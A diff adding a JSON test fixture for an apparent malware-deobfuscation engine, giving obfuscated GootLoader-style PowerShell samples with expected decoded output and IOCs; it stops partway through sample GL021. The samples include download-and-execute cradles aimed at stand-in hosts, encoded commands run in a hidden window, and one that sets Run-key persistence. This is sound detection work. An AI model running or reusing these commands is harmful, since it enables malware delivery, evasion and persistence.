@@ -1,0 +1,987 @@
+{
+  "family_id": "gootloader",
+  "family_display_name": "GootLoader",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "GootLoader (UNC2565/UNC2900) SEO-poisoned JavaScript-to-PowerShell loader. This pack covers the deterministic PowerShell handoff techniques observed downstream of the JS decoder stage. JavaScript-side unicode / atob / split-shuffle obfuscation is declared in the known-technique universe as an explicit coverage gap (zero samples) until the engine gains JS-native decoders.",
+  "primary_mitre_attack": [
+    "T1059.001",
+    "T1059.007",
+    "T1105",
+    "T1027.010",
+    "T1140",
+    "T1547.001",
+    "T1608.001"
+  ],
+  "primary_behaviors": [
+    "seo_poisoning_delivery",
+    "javascript_to_powershell_handoff",
+    "download_and_execute",
+    "obfuscated_command_line",
+    "registry_run_key_persistence"
+  ],
+  "known_technique_universe": [
+    "cmd_caret_powershell_handoff",
+    "javascript_atob_chain",
+    "javascript_string_split_shuffle",
+    "javascript_unicode_escape",
+    "nested_multi_layer_encoding",
+    "powershell_backtick_obfuscation",
+    "powershell_case_obfuscation",
+    "powershell_encodedcommand_base64_utf16le",
+    "powershell_env_var_slicing",
+    "powershell_iex_download_cradle",
+    "powershell_iwr_useb_iex_pipeline",
+    "powershell_string_concat_obfuscation",
+    "powershell_variable_reconstruction"
+  ],
+  "coverage_gap_techniques": [
+    "javascript_atob_chain",
+    "javascript_string_split_shuffle",
+    "javascript_unicode_escape"
+  ],
+  "techniques": [
+    {
+      "id": "powershell_iex_download_cradle",
+      "display_name": "PowerShell IEX DownloadString Cradle",
+      "description": "GootLoader's second-stage `IEX ((New-Object Net.WebClient).DownloadString($url))` pattern, delivering next-stage script from a compromised WordPress domain.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "GL001",
+          "variant": "iex_downloadstring_wordpress_next_stage",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString(\"http://compromised-wp.example.com/wp-content/uploads/next.ps1\"))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "compromised-wp.example.com/wp-content/uploads/next.ps1"
+            ],
+            "iocs_contains": [
+              "http://compromised-wp.example.com/wp-content/uploads/next.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c2f7a0c23e9583cbffe319cf172659453af0d4f62259a18f13211376c044d072",
+              "certificate_fingerprint": "b34c0b5bf4f971c6ec5fe21b62640667284d0cde9183d3da3f3cada3cfbd05f6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL002",
+          "variant": "iex_downloadstring_lowercase_wp",
+          "input": "iex ((new-object net.webclient).downloadstring(\"http://wp-victim.example.org/wp-content/themes/gl_stage2\"))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "wp-victim.example.org/wp-content/themes/gl_stage2"
+            ],
+            "iocs_contains": [
+              "http://wp-victim.example.org/wp-content/themes/gl_stage2"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "60d2c81ec9e5a09ba35e9435c9b27db2bcd82cf6a800c75d613659922f30b26b",
+              "certificate_fingerprint": "bc80ed9dc757077ae6a80dea577f63a91a9bd339c025617176805003b554fe11",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL003",
+          "variant": "iex_downloadstring_https_gootloader_dropper",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('https://gl-stage.example.net/dropper.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://gl-stage.example.net/dropper.ps1"
+            ],
+            "iocs_contains": [
+              "https://gl-stage.example.net/dropper.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "70fcc63df44f6bf0829ea7c52aae59088671d226fd89ef69d171c0aa9e0d4d7b",
+              "certificate_fingerprint": "442be36a4edd74304bef23e7d8e5759307ad9d80e072bfac22ff5eec251edb84",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_iwr_useb_iex_pipeline",
+      "display_name": "PowerShell IWR + UseBasicParsing | IEX",
+      "description": "`iwr $url -useb | iex` fetch-and-execute pipeline (GootLoader Stage-3 pattern; used for both PowerShell and Cobalt Strike payload delivery).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "GL004",
+          "variant": "iwr_useb_iex_wp_stage3",
+          "input": "iwr 'http://gl-cdn.example.com/wp/stage3.txt' -UseBasicParsing | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://gl-cdn.example.com/wp/stage3.txt",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://gl-cdn.example.com/wp/stage3.txt"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "df0d9509e24a3d8ef4a3c814e39f5ff271f5ef25c203ca4e54a77eddcf1e8d1a",
+              "certificate_fingerprint": "898a91261dda49a986c0d6fb6fc3a8f278fa0b31b067946a1f49a9e46239204b",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL005",
+          "variant": "iwr_useb_iex_https",
+          "input": "iwr https://gl-victim.example.net/wp-content/plugins/gl4.ps1 -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://gl-victim.example.net/wp-content/plugins/gl4.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://gl-victim.example.net/wp-content/plugins/gl4.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "df51a56a95c91fcac2b73e1a14fd23d06d684799f37e666d34698d6fc9424daa",
+              "certificate_fingerprint": "555cd2e07a1c2e1bc107ae89a72c0e1c3d8c5eb4341a94000ae9b504e61fa409",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_variable_reconstruction",
+      "display_name": "PowerShell Variable Reconstruction",
+      "description": "GootLoader authors split the URL and cmdlet arguments across multiple single-quoted variables, then concat them into the final invocation. Requires string-concat-fold and variable-propagate together.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "GL006",
+          "variant": "three_var_url_reconstruct",
+          "input": "$a='ht'; $b='tp://'; $c='gl-recon.example.com/dropper.ps1'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-recon.example.com/dropper.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-recon.example.com/dropper.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "ffdf3a9b14f78f2e58ae3449fc4d4e9f736a36fb27738a9d951e98b275077aa6",
+              "certificate_fingerprint": "3c03b3c46d51f7f8be575cc08d3d487c7ea8b1343021020c2c75f4156e230724",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL007",
+          "variant": "four_var_url_reconstruct_https",
+          "input": "$s='ht'+'tps'; $d='://gl-4v.example.org'; $p='/wp-content'; $f='/gl_stage.ps1'; iex ((new-object net.webclient).downloadstring($s+$d+$p+$f))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://gl-4v.example.org/wp-content/gl_stage.ps1"
+            ],
+            "iocs_contains": [
+              "https://gl-4v.example.org/wp-content/gl_stage.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "04780a632aba932e673f9a9fbf09d297efdeb4827f49d764f8f6113654147968",
+              "certificate_fingerprint": "b8db8efec986d2c1ad93387d5a62b75514f8b0fcec578e46061074be5f67ff78",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL008",
+          "variant": "single_var_full_url",
+          "input": "$u='http://gl-1v.example.com/gl_final.ps1'; iex ((new-object net.webclient).downloadstring($u))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-1v.example.com/gl_final.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-1v.example.com/gl_final.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "12c83f963efd6c9c4049d0e86ab3ff41c963647c3e0048130028600d094fd4e3",
+              "certificate_fingerprint": "5f5a9a26ac0741c2b3b960308af8ffb7d1adee03e28a5aa6462933b85215bef6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_string_concat_obfuscation",
+      "display_name": "PowerShell String-Concat URL Obfuscation",
+      "description": "URL literal reconstructed at the call site with 2-4 SQ concat fragments \u2014 no intermediate variables.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "GL009",
+          "variant": "inline_concat_2part",
+          "input": "iex ((new-object net.webclient).downloadstring('http://gl-cat.example.com/'+'gl_a.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-cat.example.com/gl_a.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-cat.example.com/gl_a.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "f8f3188ef72403d1395a889eee1611ef3f64d4cb064a11f78e0735897a4f6f40",
+              "certificate_fingerprint": "9dc0163ac8effee6ae4994d4dbaf10c9dcce8aa658d8e596cd98ff953554aeae",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL010",
+          "variant": "inline_concat_4part",
+          "input": "iex ((new-object net.webclient).downloadstring('ht'+'tp'+'://gl-cat.example.org/'+'gl_b.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-cat.example.org/gl_b.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-cat.example.org/gl_b.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "71bac5561a3b8aa85a9defa5ecc00f235f9d631b1ecebc52f7f2b8a8c4504b44",
+              "certificate_fingerprint": "11c5c3c9c02853202bfa0831cb31e41000f9a3de3ceb1e4aeab66c263933ff39",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_base64_utf16le",
+      "display_name": "PowerShell -EncodedCommand (Base64/UTF-16LE)",
+      "description": "Base64-encoded UTF-16LE next-stage script delivered via `-EncodedCommand` / `-Enc` / `-enc` (GootLoader final-stage PowerShell handoff).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "GL011",
+          "variant": "encodedcommand_iex_cradle",
+          "input": "powershell -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBnAGwALQBlAG4AYwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQBfAGkAZQB4AC4AcABzADEAJwApACkA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-enc.example.com/stage_iex.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-enc.example.com/stage_iex.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "0e65478b93bfa91c8fe7952c00d75f283b301cef7ae4ada2b3d26a2bfe85e62b",
+              "certificate_fingerprint": "d227ba1b1f5fbe69fa8b227530ea4b4ed09a3e51911f527225d8d8a9f1f6e996",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL012",
+          "variant": "encodedcommand_hidden_window",
+          "input": "powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBnAGwALQBoAGkAZABkAGUAbgAuAGUAeABhAG0AcABsAGUALgBvAHIAZwAvAGcAbABfAGgALgBwAHMAMQAnACkAKQA=",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-hidden.example.org/gl_h.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-hidden.example.org/gl_h.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1564.003"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "hidden_window",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "6a9cb57c4bc6c32224b5586f2b7dfa9a112833c5b7f160f3033cbaa18dc0982b",
+              "certificate_fingerprint": "1b2727fabaa75aefbeee3ccc00ca5bb9340a3322bed40f185252c5a45f61e4ed",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL013",
+          "variant": "encodedcommand_writehost_beacon_check",
+          "input": "powershell -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACIARwBvAG8AdABMAG8AYQBkAGUAcgAgAGIAZQBhAGMAbwBuACAAYwBoAGUAYwBrAC0AaQBuACIA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "GootLoader beacon check-in"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027"
+            ],
+            "behaviors": [
+              "obfuscated_command_line",
+              "beacon_checkin"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "9087c7cb180d4d4e34fe22098fe3d1f7a9a2d11848bbf45a9644d9106646d179",
+              "certificate_fingerprint": "979da8af6f19081821bd6c387c823800eb2a1fc7ed06940de4d75ecc2defa9a7",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL014",
+          "variant": "encodedcommand_registry_persistence",
+          "input": "powershell -Enc UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC0ATgBhAG0AZQAgAEcATABQAGUAcgBzAGkAcwB0ACAALQBWAGEAbAB1AGUAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgAEkARQBYACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZwBsAC0AcABlAHIAcwBpAHMAdAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGcAbAAuAHAAcwAxACcAKQApACIA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Set-ItemProperty",
+              "CurrentVersion\\Run",
+              "GLPersist",
+              "http://gl-persist.example.com/gl.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-persist.example.com/gl.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1547.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "registry_run_key_persistence",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "91efeb6d54df7b69781dc808de77f4368474f6cc6f23b7f630045232eb6e932f",
+              "certificate_fingerprint": "065265c194446af61aae43876e5ab111d16ece8a78a8ac2887d83c31162d7187",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_env_var_slicing",
+      "display_name": "PowerShell Environment-Variable Slicing",
+      "description": "Cmdlet names and switches reconstructed at runtime from `$env:ComSpec[..]`, `$env:PATH[..]`, `$env:Public[..]` indexes. Requires env-substitute + string-index-fold + structural-fold.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "GL015",
+          "variant": "env_slice_reconstruct_ps_command",
+          "input": "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX ((New-Object Net.WebClient).DownloadString('http://gl-env.example.com/env_stage.ps1'))\" )",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "env-substitute",
+              "string-index-fold",
+              "structural-fold"
+            ],
+            "final_output_contains": [
+              "gl-env.example.com/env_stage.ps1",
+              "DownloadString"
+            ],
+            "iocs_contains": [
+              "http://gl-env.example.com/env_stage.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010",
+              "T1140"
+            ],
+            "behaviors": [
+              "env_var_slicing",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d4f541c84bba89d5904637d1cab57ebf51b499e2b165a79b6358335748508b38",
+              "certificate_fingerprint": "931b38b814a3d36d3c0dc99da205853386aa2f85b0d076ce3669a3ce9314ccc9",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL016",
+          "variant": "env_slice_writehost_stager",
+          "input": "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD Write-Host 'GootLoader env slice reached'\" )",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "env-substitute",
+              "string-index-fold",
+              "structural-fold"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "GootLoader env slice reached"
+            ],
+            "iocs_contains": [],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027.010",
+              "T1140"
+            ],
+            "behaviors": [
+              "env_var_slicing",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "29a88dadedc05dcb7d15fdd21c9df8993f3bfc8946bd38e0ddd4e26622caf9dc",
+              "certificate_fingerprint": "8cfaef96393c79abee798301a1cf3a4e45a0ce057b43c214c302d859f17793f4",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_backtick_obfuscation",
+      "display_name": "PowerShell Backtick Alias Obfuscation",
+      "description": "GootLoader injects backtick escapes mid-identifier to break signature-based EDR (e.g. `I`E`X`, `i`w`r`, `i`e`x`).",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "GL017",
+          "variant": "backtick_iex_downloadstring",
+          "input": "I`E`X ((New-Object Net.WebClient).DownloadString('http://gl-bt.example.com/bt.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-bt.example.com/bt.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-bt.example.com/bt.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "e2111dde9354b428830896e6ab8bff8f2b20f6e37c11c08c026126313db07207",
+              "certificate_fingerprint": "c9eb83697e3b0a31a091003debfa6ada359553ba6e7f20285b854d32f8c00278",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL018",
+          "variant": "backtick_iwr_useb_iex",
+          "input": "i`wr 'https://gl-bt2.example.org/bt2.ps1' -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://gl-bt2.example.org/bt2.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://gl-bt2.example.org/bt2.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "24ccdc321e8bd582aabacaf0ae7da32c4ceb0ac1b80b12039c75525ff458b100",
+              "certificate_fingerprint": "b72bc0b9efa0e50cc29bc7ff3568667c0f082cb903a945339c9b4249983f98e5",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_case_obfuscation",
+      "display_name": "PowerShell Random-Case Obfuscation",
+      "description": "GootLoader randomizes cmdlet and alias casing to break string-match detections.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "GL019",
+          "variant": "random_case_iex_downloadstring",
+          "input": "iEx ((nEw-oBjecT nEt.WebClIent).DoWnLoAdStrIng('http://gl-cs.example.com/cs.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-cs.example.com/cs.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-cs.example.com/cs.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "case_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "7008edf95623a792d9ecf24f3275dc0b25c33ae0b05f911bc63008768dc8b71a",
+              "certificate_fingerprint": "d093fa95536146f5431c321a12625e0c55c6f8e0dacbbfa25f1aac559990bdf9",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        },
+        {
+          "id": "GL020",
+          "variant": "random_case_iwr_iex_pipeline",
+          "input": "IwR 'http://gl-cs2.example.org/cs2.ps1' -uSeB | iEx",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://gl-cs2.example.org/cs2.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://gl-cs2.example.org/cs2.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "case_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "2515c37f29afda0458b5bbc2a9ac3caa4c6e22336169c6ec8988e44b78bf03f3",
+              "certificate_fingerprint": "67834c2a9da7bd7050f31eb9995dc00e11c55fc8e515ea66863f0ef71c94ffc5",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "cmd_caret_powershell_handoff",
+      "display_name": "CMD Caret \u2192 PowerShell Handoff",
+      "description": "wscript.exe / cscript.exe launches cmd.exe with caret-escaped arguments, which shells out to powershell.exe with an -EncodedCommand base64 payload. Rare in GootLoader main chain but observed in derivative loaders.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1059.003",
+        "T1105",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "GL021",
